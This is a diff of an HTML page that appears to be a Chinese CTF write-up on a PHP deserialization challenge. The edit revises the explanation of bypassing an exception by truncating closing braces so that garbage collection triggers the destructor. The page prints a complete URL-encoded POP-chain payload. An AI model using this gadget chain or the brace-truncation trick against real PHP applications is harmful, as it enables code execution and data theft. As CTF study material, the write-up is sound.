@@ -60,7 +60,7 @@
       </li>
       <li>
         
-    更新 <time datetime="2022-03-05T08:03:17.183Z" itemprop="dateUpdated">2022-03-05</time>
+    更新 <time datetime="2022-03-05T10:18:32.189Z" itemprop="dateUpdated">2022-03-05</time>
 
       </li>
       <li id="busuanzi_container_page_pv">
@@ -95,7 +95,7 @@
 <ol>
 <li><p><code>$var[$string]()</code> 这里，要怎样才能调用到 <code>one.MeMeMe()</code>？</p>
 </li>
-<li><p>反序列化之后直接抛出异常，怎样绕过？</p>
+<li><p>抛出异常会阻止了析构函数的执行，怎样绕过？</p>
 </li>
 </ol>
 <h3 id="解决难点1"><a href="#解决难点1" class="headerlink" title="解决难点1"></a>解决难点1</h3><p>对第一个问题百思不得其解，其中尝试过让 <code>$string[&#39;string&#39;] = &quot;one::MeMeMe&quot; </code>，等操作均不行，最终看了writeup才知道，还可以用数组的方式来指定某个对象，也就是：</p>
@@ -107,17 +107,14 @@
 <p>得到序列化结果：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; php exp.php</span><br><span class="line"></span><br><span class="line">O%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>
 
-<p>那么问题来到了第二个难点。。反序列化之后直接抛出了异常，不管能不能拿到flag都会异常。</p>
+<p>那么问题来到了第二个难点。。抛出异常无法触发垃圾回收机制，所以不能执行析构函数。</p>
 <p><img src="image-20220305104951551.png" alt="image-20220305104951551"></p>
-<h3 id="解决难点2"><a href="#解决难点2" class="headerlink" title="解决难点2"></a>解决难点2</h3><p>还是看了writeup才知道，原来<strong>可以先让反序列化的时候提前产生异常，就不会走到下面的抛出异常</strong>。</p>
-<blockquote>
-<p> 怎样让反序列化产生异常，又不会影响反序列化操作？</p>
-</blockquote>
-<p>方法是，去掉序列化字符串里面结尾的花括号，也就是去掉 <code>%7D</code>。这样的序列化既是不完整的，又能进行正常反序列化。</p>
-<p>后面去掉几个 <code>%7D</code>  都可以，最终payload：</p>
+<h3 id="解决难点2"><a href="#解决难点2" class="headerlink" title="解决难点2"></a>解决难点2</h3><p>这里应当是绕过垃圾回收机制触发析构函数，具体原理还没搞懂下次再研究，官方wp的方法是，去掉序列化字符串里面结尾的花括号，也就是去掉 <code>%7D</code>，神奇的操作….最终payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=O%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>
 
 <p><img src="image-20220305105438930.png" alt="image-20220305105438930"></p>
+<p>关于GC回收可以参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/">https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/</a></p>
 
       </div>
         <!-- <div class="support-author">
